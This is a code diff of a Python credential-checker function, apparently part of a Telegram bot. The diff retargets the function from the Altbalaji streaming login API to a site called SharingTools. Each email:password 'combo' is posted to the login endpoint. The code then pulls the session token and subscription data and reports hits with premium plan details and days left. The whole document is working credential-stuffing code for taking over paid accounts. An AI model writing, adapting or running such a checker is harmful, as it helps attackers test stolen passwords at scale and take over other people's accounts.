@@ -14,7 +14,7 @@ def sharingtools_helper(chat_id, combo):
     password = f'"password":"{inpupass}"'
 
     session_request = requests.Session()
-    url = 'https://api.cloud.altbalaji.com/accounts/login?domain=IN'
+    url = 'https://www.sharingtools.services/login'
     payload = '{%s,%s}' %(email, password)
     response = session_request.post(url, data=payload)
     result = response.json()
@@ -22,7 +22,7 @@ def sharingtools_helper(chat_id, combo):
         state=result['status']
         code=result['code']
         messg = result['message']
-        text = f'<b>Bad Combo ❌</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: {state}\nCode: {code}\nMessage: {messg}\nSite: Altbalaji</b>'
+        text = f'<b>Bad Combo ❌</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: {state}\nCode: {code}\nMessage: {messg}\nSite: SharingTools</b>'
         Editmessage(chat_id, text, status)
         return
     session_token = result['session_token']
@@ -39,7 +39,7 @@ def sharingtools_helper(chat_id, combo):
     response = session_request.get(subs_url, headers=head2)
     result = response.json()
     if result['orders'] == []:
-         expired_text = f'<b>Free Combo ❌</b>\n<b>Site: Altbalaji</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Free</b>'
+         expired_text = f'<b>Free Combo ❌</b>\n<b>Site: Sharingtools</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Free</b>'
          Editmessage(chat_id, expired_text, status)
          return
     validto = result['orders'][0]['dates']['valid_to']
@@ -55,5 +55,5 @@ def sharingtools_helper(chat_id, combo):
     Pack_name = subscription['default']
     Pack_recur = str(result['orders'][0]['product']['recurring'])
     Pack_date = subscription['en']
-    pro_message = f'<b>🌟 Hit Combo 💫</b>\n<b>Site: Altbalaji</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Premium\nPlan: {Pack_name}\nType: {Pack_date}\nDays Left: {days.days}\nRecurring: {Pack_recur.capitalize()}</b>'
+    pro_message = f'<b>🌟 Hit Combo 💫</b>\n<b>Site: SharingTools</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Premium\nPlan: {Pack_name}\nType: {Pack_date}\nDays Left: {days.days}\nRecurring: {Pack_recur.capitalize()}</b>'
     Editmessage(chat_id, pro_message, status)
